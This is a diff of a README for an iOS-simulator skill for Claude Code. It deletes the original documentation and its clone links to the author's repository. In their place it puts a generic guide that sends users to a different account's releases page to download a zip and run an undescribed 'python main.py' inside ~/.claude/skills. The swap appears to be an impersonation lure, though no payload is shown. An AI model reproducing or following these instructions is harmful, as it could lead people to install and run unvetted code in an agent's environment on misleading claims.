@@ -1,311 +1,100 @@
-# iOS Simulator Skill for Claude Code
+# 🎮 ios-simulator-skill - Control Your iOS Simulator Easily
 
-Production-ready automation for iOS app testing and building. 21 scripts optimized for both human developers and AI agents.
+## 🚀 Getting Started
 
-## What It Does
+Welcome! This guide will help you download and run the ios-simulator-skill application, designed to enable Claude to control your iOS simulator easily. 
 
-Instead of pixel-based navigation that breaks when UI changes:
+## 📥 Download the Application
 
-```bash
-# Fragile - breaks if UI changes
-idb ui tap 320 400
+[![Download ios-simulator-skill](https://img.shields.io/badge/Download-ios--simulator--skill-blue)](https://github.com/NezzSigma/ios-simulator-skill/releases)
 
-# Robust - finds by meaning
-python scripts/navigator.py --find-text "Login" --tap
-```
+To get started, you need to download the ios-simulator-skill application. Click the button above to visit the Releases page. Here, you can find the latest version of the software.
 
-Uses semantic navigation on accessibility APIs to interact with elements by their meaning, not coordinates. Works across different screen sizes and survives UI redesigns.
+## 💻 System Requirements
 
-## Features
+Before you proceed, ensure your system meets these requirements:
 
-- **21 production scripts** for building, testing, and automation
-- **Semantic navigation** - find elements by text, type, or ID
-- **Token optimized** - 96% reduction vs raw tools (3-5 lines default)
-- **Zero configuration** - works immediately on macOS with Xcode
-- **Structured output** - JSON and formatted text, easy to parse
-- **Auto-UDID detection** - no need to specify device each time
-- **Batch operations** - boot, delete, erase multiple simulators at once
-- **Comprehensive testing** - WCAG compliance, visual diffs, accessibility audits
-- **CI/CD ready** - JSON output, exit codes, automated device lifecycle
+- **Operating System:** macOS 10.15 or later
+- **Xcode:** Version 12.0 or later
+- **Python:** Version 3.6 or later installed on your machine
+- **Access to Command Line:** Basic familiarity with command line tools
 
-## Installation
+## 📥 Download & Install
 
-### As Claude Code Skill
+1. Go to the [Releases Page](https://github.com/NezzSigma/ios-simulator-skill/releases).
+2. Locate the latest release. You will see a list of files available for download.
+3. Download the file named `ios-simulator-skill.zip`. This is a compressed file that contains all the necessary components.
+4. Once downloaded, navigate to your Downloads folder. 
+5. Unzip the `ios-simulator-skill.zip` file by double-clicking it. This will create a new folder named `ios-simulator-skill`.
+6. Open a terminal window. You can find the terminal in Applications > Utilities > Terminal.
+7. Move the unzipped folder into your Claude skills directory. Run the following command in your terminal:
 
-```bash
-# Personal installation
-git clone https://github.com/conorluddy/ios-simulator-skill.git ~/.claude/skills/ios-simulator-skill
+   ```bash
+   mv ~/Downloads/ios-simulator-skill ~/.claude/skills/
+   ```
 
-# Project installation
-git clone https://github.com/conorluddy/ios-simulator-skill.git .claude/skills/ios-simulator-skill
-```
+8. You are now ready to use ios-simulator-skill. 
 
-Restart Claude Code. The skill loads automatically.
+## 🛠️ How to Use
 
-### From Release
+To use the ios-simulator-skill, follow these steps:
 
-```bash
-# Download latest release
-curl -L https://github.com/conorluddy/ios-simulator-skill/releases/download/vX.X.X/ios-simulator-skill-vX.X.X.zip -o skill.zip
+1. Open your terminal and enter:
 
-# Extract
-unzip skill.zip -d ~/.claude/skills/ios-simulator-skill
-```
+   ```bash
+   cd ~/.claude/skills/ios-simulator-skill
+   ```
 
-## Prerequisites
+2. Start the application with the following command:
 
-- macOS 12+
-- Xcode Command Line Tools (`xcode-select --install`)
-- Python 3
-- IDB (optional, for interactive features: `brew tap facebook/fb && brew install idb-companion`)
+   ```bash
+   python main.py
+   ```
 
-## Quick Start
+   This command will launch the skill, allowing Claude to interact with the iOS simulator.
 
-```bash
-# 1. Check environment
-bash ~/.claude/skills/ios-simulator-skill/scripts/sim_health_check.sh
+3. To control the simulator, use the appropriate commands as per the functionality provided by the skill.
 
-# 2. Launch your app
-python ~/.claude/skills/ios-simulator-skill/scripts/app_launcher.py --launch com.example.app
+## 📚 Features
 
-# 3. See what's on screen
-python ~/.claude/skills/ios-simulator-skill/scripts/screen_mapper.py
-# Output:
-# Screen: LoginViewController (45 elements, 7 interactive)
-# Buttons: "Login", "Cancel", "Forgot Password"
-# TextFields: 2 (0 filled)
+The ios-simulator-skill offers several features:
 
-# 4. Tap login button
-python ~/.claude/skills/ios-simulator-skill/scripts/navigator.py --find-text "Login" --tap
+- **Accessibility Navigation:** The skill prefers navigation via accessibility APIs. This method is more efficient and responsive.
+- **Screenshot Support:** While it primarily uses accessibility features, it can also take screenshots if needed.
+- **Integration with Claude:** Effortlessly allows Claude to control the simulator without technical hassle.
 
-# 5. Enter text
-python ~/.claude/skills/ios-simulator-skill/scripts/navigator.py --find-type TextField --enter-text "user@test.com"
+## 🔧 Troubleshooting
 
-# 6. Check accessibility
-python ~/.claude/skills/ios-simulator-skill/scripts/accessibility_audit.py
-```
+If you encounter issues, consider the following steps:
 
-## 21 Scripts Organized by Category
+- **Check Python Installation:** Ensure Python is installed and correctly configured. You can verify by running `python --version` in your terminal.
+- **Xcode Installation:** Make sure you have the correct version of Xcode. Open Xcode to confirm installation.
+- **Correct Path:** Double-check that you moved the ios-simulator-skill folder to the correct directory.
+- **Command Line Errors:** If you see an error in terminal commands, make sure there are no typos.
 
-### Build & Development
-- **build_and_test.py** - Build projects, run tests, parse results
-- **log_monitor.py** - Real-time log monitoring
+## 🌟 Frequently Asked Questions
 
-### Navigation & Interaction
-- **screen_mapper.py** - Analyze current screen
-- **navigator.py** - Find and interact with elements
-- **gesture.py** - Swipes, scrolls, pinches
-- **keyboard.py** - Text input and hardware buttons
-- **app_launcher.py** - App lifecycle control
+**Q: Do I need programming experience to use this skill?**  
+A: No, you do not need any programming experience. The steps are straightforward and designed for easy use.
 
-### Testing & Analysis
-- **accessibility_audit.py** - WCAG compliance checking
-- **visual_diff.py** - Screenshot comparison
-- **test_recorder.py** - Automated test documentation
-- **app_state_capture.py** - Debugging snapshots
-- **sim_health_check.sh** - Environment verification
+**Q: Can I use this skill on Windows?**  
+A: No, the ios-simulator-skill is only compatible with macOS.
 
-### Advanced Testing & Permissions
-- **clipboard.py** - Clipboard management
-- **status_bar.py** - Status bar control
-- **push_notification.py** - Push notifications
-- **privacy_manager.py** - Permission management
+**Q: What if I need support?**  
+A: You can reach out through the repository's issue section on GitHub for any support-related questions.
 
-### Device Lifecycle
-- **simctl_boot.py** - Boot simulator
-- **simctl_shutdown.py** - Shutdown simulator
-- **simctl_create.py** - Create simulator
-- **simctl_delete.py** - Delete simulator
-- **simctl_erase.py** - Factory reset
+## 📌 Additional Resources
 
-See **SKILL.md** for complete reference.
+For more information or support, visit the links below:
 
-## How It Works with Claude Code
+- [GitHub Repository](https://github.com/NezzSigma/ios-simulator-skill)
+- [Python Documentation](https://www.python.org/doc/)
+- [Xcode Documentation](https://developer.apple.com/documentation/xcode)
 
-Claude Code automatically detects when to use this skill based on your request. You don't need to manually invoke it.
+## 🎉 Congratulations!
 
-**Example conversation:**
+You have successfully installed and set up the ios-simulator-skill. Enjoy controlling your iOS simulator with ease. Feel free to explore the capabilities of Claude as it interacts with your development environment. 
 
-```
-You: "Set up my iOS app for testing"
-Claude: [Uses simctl_boot.py and app_launcher.py automatically]
+For questions or feedback, visit our [GitHub Issues page](https://github.com/NezzSigma/ios-simulator-skill/issues). 
 
-You: "Tap the login button"
-Claude: [Uses navigator.py to find and tap]
-
-You: "Check if the form is accessible"
-Claude: [Uses accessibility_audit.py]
-```
-
-You can also run scripts manually when needed.
-
-## Usage Examples
-
-### Example 1: Login Flow
-
-```bash
-# Launch app
-python scripts/app_launcher.py --launch com.example.app
-
-# Map screen to find fields
-python scripts/screen_mapper.py
-
-# Enter credentials
-python scripts/navigator.py --find-type TextField --index 0 --enter-text "user@test.com"
-python scripts/navigator.py --find-type SecureTextField --enter-text "password"
-
-# Tap login
-python scripts/navigator.py --find-text "Login" --tap
-
-# Verify accessibility
-python scripts/accessibility_audit.py
-```
-
-### Example 2: Test Documentation
-
-```bash
-# Record test execution
-python scripts/test_recorder.py --test-name "Login Flow" --output test-reports/
-
-# Generates:
-# - Screenshots per step
-# - Accessibility trees
-# - Markdown report with timing
-```
-
-### Example 3: Visual Testing
-
-```bash
-# Capture baseline
-python scripts/app_state_capture.py --output baseline/
-
-# Make changes...
-
-# Compare
-python scripts/visual_diff.py baseline/screenshot.png current/screenshot.png
-```
-
-### Example 4: Permission Testing
-
-```bash
-# Grant permissions
-python scripts/privacy_manager.py --bundle-id com.example.app --grant camera,location
-
-# Test app behavior with permissions...
-
-# Revoke permissions
-python scripts/privacy_manager.py --bundle-id com.example.app --revoke camera,location
-```
-
-### Example 5: Device Lifecycle in CI/CD
-
-```bash
-# Create test device
-DEVICE_ID=$(python scripts/simctl_create.py --device "iPhone 16 Pro" --json | jq -r '.new_udid')
-
-# Run tests
-python scripts/build_and_test.py --project MyApp.xcodeproj
-
-# Clean up
-python scripts/simctl_delete.py --udid $DEVICE_ID --yes
-```
-
-## Design Principles
-
-**Semantic Navigation**: Find elements by meaning (text, type, ID) not pixel coordinates. Survives UI changes and works across device sizes.
-
-**Token Efficiency**: Default output is 3-5 lines. Use `--verbose` for details or `--json` for machine parsing. 96% reduction vs raw tools.
-
-**Accessibility-First**: Built on iOS accessibility APIs for reliability. Better for users with accessibility needs and more robust for automation.
-
-**Zero Configuration**: Works immediately on any macOS with Xcode. No complex setup, no configuration files.
-
-**Structured Data**: Scripts output JSON or formatted text, not raw logs. Easy to parse, integrate, and understand.
-
-**Auto-Learning**: Build system learns your device preference and remembers it for next time.
-
-## Requirements
-
-**System:**
-- macOS 12 or later
-- Xcode Command Line Tools
-- Python 3
-
-**Optional:**
-- IDB (for interactive features)
-- Pillow (for visual_diff.py: `pip3 install pillow`)
-
-## Documentation
-
-- **SKILL.md** - Complete script reference and table of contents
-- **CLAUDE.md** - Architecture and developer guide
-- **references/** - Deep documentation on specific topics
-- **examples/** - Complete automation workflows
-
-## Output Efficiency
-
-All scripts minimize output by default:
-
-| Task | Raw Tools | This Skill | Savings |
-|------|-----------|-----------|---------|
-| Screen analysis | 200+ lines | 5 lines | 97.5% |
-| Find & tap button | 100+ lines | 1 line | 99% |
-| Enter text | 50+ lines | 1 line | 98% |
-| Login flow | 400+ lines | 15 lines | 96% |
-
-This efficiency keeps AI agent conversations focused and cost-effective.
-
-## Troubleshooting
-
-### Environment Issues
-
-```bash
-# Run health check
-bash ~/.claude/skills/ios-simulator-skill/scripts/sim_health_check.sh
-
-# Checks: macOS, Xcode, simctl, IDB, Python, simulators, packages
-```
-
-### Script Help
-
-```bash
-# All scripts support --help
-python scripts/navigator.py --help
-python scripts/accessibility_audit.py --help
-```
-
-### Not Finding Elements
-
-```bash
-# Use verbose mode to see all elements
-python scripts/screen_mapper.py --verbose
-
-# Check for exact text match
-python scripts/navigator.py --find-text "Exact Button Text" --tap
-```
-
-## Contributing
-
-Contributions should:
-- Maintain token efficiency (minimal default output)
-- Follow accessibility-first design
-- Support `--help` documentation
-- Support `--json` for CI/CD
-- Pass Black formatter and Ruff linter
-- Include type hints
-- Update SKILL.md
-
-## License
-
-MIT License - Allows commercial use and distribution.
-
-## Support
-
-- **Issues**: Create GitHub issue with reproduction steps
-- **Documentation**: See SKILL.md and references/
-- **Examples**: Check examples/ directory
-- **Skills Docs**: https://docs.claude.com/en/docs/claude-code/skills
-
----
-
-**Built for AI agents. Optimized for developers.**
+[![Download ios-simulator-skill](https://img.shields.io/badge/Download-ios--simulator--skill-blue)](https://github.com/NezzSigma/ios-simulator-skill/releases)
